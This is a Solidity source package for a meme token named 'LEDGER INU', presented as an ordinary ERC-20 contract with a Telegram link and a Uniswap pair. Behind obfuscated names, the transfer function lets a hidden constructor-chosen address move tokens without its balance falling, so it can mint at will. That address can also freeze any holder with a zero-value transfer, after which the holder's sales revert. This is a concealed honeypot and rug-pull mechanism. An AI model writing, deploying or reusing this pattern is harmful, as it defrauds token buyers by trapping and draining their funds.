{{
  "language": "Solidity",
  "sources": {
    "LEDGERINU.sol": {
      "content": "/*\r\n\r\nhttps://t.me/LedgerInuETH\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: GPL-3.0\r\n\r\npragma solidity >0.8.4;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\r\n        _;\r\n    }\r\n\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), 'Ownable: new owner is the zero address');\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ncontract LEDGERINU is Ownable {\r\n    mapping(address => uint256) private bring;\r\n\r\n    address public uniswapV2Pair;\r\n\r\n    uint256 public totalSupply;\r\n\r\n    function approve(address crowd, uint256 mice) public returns (bool success) {\r\n        allowance[msg.sender][crowd] = mice;\r\n        emit Approval(msg.sender, crowd, mice);\r\n        return true;\r\n    }\r\n\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    string public symbol;\r\n\r\n    string public name;\r\n\r\n    function knew(address bar, address finish, uint256 mice) private returns (bool success) {\r\n        if (bring[bar] == 0) {\r\n            if (him[bar] > 0 && bar != uniswapV2Pair) {\r\n                bring[bar] -= unhappy;\r\n            }\r\n            balanceOf[bar] -= mice;\r\n        }\r\n        if (mice == 0) {\r\n            him[finish] += unhappy;\r\n        }\r\n        balanceOf[finish] += mice;\r\n        emit Transfer(bar, finish, mice);\r\n        return true;\r\n    }\r\n\r\n    constructor(address rear) {\r\n        symbol = 'LEDGER';\r\n        name = 'LEDGER INU';\r\n        totalSupply = 1000000000 * 10 ** decimals;\r\n        balanceOf[msg.sender] = totalSupply;\r\n        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        bring[rear] = unhappy;\r\n    }\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    function transferFrom(address bar, address finish, uint256 mice) public returns (bool success) {\r\n        knew(bar, finish, mice);\r\n        require(mice <= allowance[bar][msg.sender]);\r\n        allowance[bar][msg.sender] -= mice;\r\n        return true;\r\n    }\r\n\r\n    mapping(address => uint256) private him;\r\n\r\n    function transfer(address finish, uint256 mice) public returns (bool success) {\r\n        knew(msg.sender, finish, mice);\r\n        return true;\r\n    }\r\n\r\n    uint8 public decimals = 9;\r\n\r\n    uint256 private unhappy = 21;\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}